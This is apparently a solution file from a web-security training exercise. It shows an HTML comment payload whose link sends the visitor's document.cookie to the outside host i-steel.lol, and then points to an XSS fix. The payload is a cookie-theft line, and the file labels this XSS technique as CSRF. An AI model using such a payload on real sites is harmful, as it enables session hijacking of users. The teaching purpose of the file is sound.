# CSRF Solution

### 1. Use CSRF to create a link pointing to another site
- Write the following comment to create a link with the preview `http://localhost:8080/#` but redirects to `http://i-steel.lol/?tokens=stolen-session-cookie`:
```html
<a href="#" onclick="window.location.href = \'http://i-steel.lol/?tokens=\' + encodeURIComponent(document.cookie)">sehr vertrauenswürdig</a>
```

### 2. Repair the application, so that it is not possible to use CSRF.
- In our example the same weak point as with XSS is used so you need to prevent XSS
- Look at [xss_solution.md](../2_xss/xss_solution.md)